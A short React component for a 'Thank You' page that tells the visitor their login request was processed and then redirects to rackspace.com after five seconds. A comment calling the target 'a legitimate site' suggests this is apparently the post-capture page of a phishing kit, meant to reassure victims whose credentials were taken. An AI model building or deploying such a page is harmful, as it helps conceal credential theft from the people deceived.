import React, { useEffect } from 'react';

const ThankYouPage = () => {
  useEffect(() => {
    // Redirect to a legitimate site after delay
    const timer = setTimeout(() => {
      window.location.href = 'https://www.rackspace.com/';
    }, 5000);

    return () => clearTimeout(timer);
  }, []);

  return (
    <div className="thank-you-container">
      <div className="thank-you-card">
        <h1>Thank You</h1>
        <p>
          Your login request has been processed. For security reasons, 
          please contact your system administrator if you continue to 
          experience access issues.
        </p>
        <div className="redirect-info">
          <strong>Note:</strong> You will be redirected to the main site in a few seconds.
        </div>
      </div>
    </div>
  );
};

export default ThankYouPage;
